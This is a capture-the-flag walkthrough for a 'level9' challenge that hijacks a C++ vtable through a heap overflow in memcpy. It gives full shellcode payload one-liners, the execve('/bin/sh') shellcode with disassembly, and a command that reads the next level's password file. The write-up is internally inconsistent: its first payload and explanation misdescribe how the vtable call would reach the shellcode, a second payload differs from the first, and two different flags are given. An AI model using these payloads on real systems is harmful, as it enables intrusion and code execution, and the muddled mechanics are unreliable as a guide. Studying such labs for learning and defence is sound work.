# Level9 Walkthrough - C++ Vtable Hijacking with Shellcode

## Objective
Exploit a heap buffer overflow in a C++ program to hijack a virtual function table (vtable) and execute shellcode.

## The Vulnerability

```cpp
class N {
    void* vtable;      // Offset 0x00
    char data[100];    // Offset 0x04 - VULNERABLE!
    int value;         // Offset 0x68
};

void N::setAnnotation(char* input) {
    memcpy(this + 4, input, strlen(input));  // No bounds checking!
}
```

**The problem**: `memcpy()` copies user input without checking the length, allowing overflow from the first object into the second object.

## Memory Layout

Two objects are allocated on the heap:

```
First object  (0x804a008): [vtable][data - 100 bytes][value][padding]
Second object (0x804a078): [vtable][data - 100 bytes][value][padding]
                            ↑
                            We overwrite this!
```

**Distance**: 108 bytes from first object's data to second object's vtable pointer.

## The Attack

### Step 1: Understanding Vtable Hijacking

When the program calls a virtual function on the second object:
```cpp
second_object->operator+(first_object);
```

It does this:
1. Read vtable pointer from second object (first 4 bytes)
2. Read function pointer from vtable
3. Call that function

**Our exploit**: Overwrite the vtable pointer to point to our shellcode address!

### Step 2: Craft the Payload

```
[shellcode (23 bytes)] + [padding (81 bytes)] + [fake vtable address (4 bytes)]
```

**Breakdown**:
- **Shellcode**: execve("/bin/sh") - 23 bytes
- **Padding**: Fill remaining space to reach 104 bytes total
- **Fake vtable address**: Points to our shellcode location

### Step 3: Calculate Addresses

- First object data starts at: `0x804a008 + 4 = 0x804a00c`
- Our shellcode will be at: `0x804a00c`
- We need to overwrite second object's vtable at offset 104

**Fake vtable trick**: Point vtable to `0x804a00c - 4 = 0x804a008`

Why? Because the program will:
1. Read vtable pointer: `0x804a008`
2. Read first entry from vtable: `*(0x804a008) = 0x804a00c` (our shellcode!)
3. Call `0x804a00c` → Shellcode executes!

Wait, that won't work directly. Let's use a simpler approach:

**Better approach**: Point vtable directly to where our shellcode address is stored.

### Step 4: The Exploit

```bash
./level9 $(python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + 'A'*81 + '\x0c\xa0\x04\x08'")
```

**Payload breakdown**:
```python
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"  # 23 bytes
padding = "A" * 81  # 81 bytes
fake_vtable = "\x0c\xa0\x04\x08"  # 4 bytes - points to shellcode

# Total: 23 + 81 + 4 = 108 bytes
```

**What happens**:
1. Shellcode is written to `0x804a00c` (first object's data)
2. Padding fills the rest of first object
3. Fake vtable pointer `0x804a00c` overwrites second object's vtable
4. When virtual function is called on second object:
   - Reads vtable: `0x804a00c`
   - Reads function pointer from `0x804a00c`: This is our shellcode!
   - Executes shellcode → Shell spawned!

## The Shellcode

```assembly
\x31\xc0              xor eax, eax
\x50                  push eax
\x68\x2f\x2f\x73\x68  push "//sh"
\x68\x2f\x62\x69\x6e  push "/bin"
\x89\xe3              mov ebx, esp
\x50                  push eax
\x53                  push ebx
\x89\xe1              mov ecx, esp
\xb0\x0b              mov al, 0xb
\xcd\x80              int 0x80
```

This is a 23-byte shellcode that executes `execve("/bin/sh", ["/bin/sh"], NULL)`.

## Running the Exploit

```bash
./level9 `python -c 'print("\x0c\xa0\x04\x08" + 
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e" +
    "\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + 
    "A"*76 + "\x0c\xa0\x04\x08")'`
```

Then:
```bash
cat /home/user/bonus0/.pass
```

**Flag**:
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
## How It Works (Step-by-Step)

1. **Program allocates two objects**:
   - Object 1 at `0x804a008`
   - Object 2 at `0x804a078`

2. **setAnnotation() is called** with our payload:
   - Copies shellcode to `0x804a00c` (object 1's data)
   - Copies padding
   - **Overwrites object 2's vtable** with `0x804a00c`

3. **Virtual function is called** on object 2:
   ```
   Read vtable from object 2 → 0x804a00c
   Read function pointer from [0x804a00c] → Our shellcode bytes!
   Jump to shellcode → Shell!
   ```

## Key Concepts

### Vtable Hijacking
In C++, virtual functions use a vtable (virtual function table). Each object has a pointer to its vtable. By overwriting this pointer, we control which function gets called.

### Heap Buffer Overflow
Unlike stack overflows, heap overflows target dynamically allocated memory. Here, we overflow from one heap object into another.

### Shellcode Execution
With NX disabled, we can execute code from the heap. Our shellcode spawns a shell.

## Summary

- **Vulnerability**: Heap buffer overflow in `memcpy()`
- **Target**: Second object's vtable pointer
- **Technique**: Overwrite vtable to point to shellcode
- **Payload**: 23 bytes shellcode + 81 bytes padding + 4 bytes address
- **Result**: Shell as bonus0

**Flag**: cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
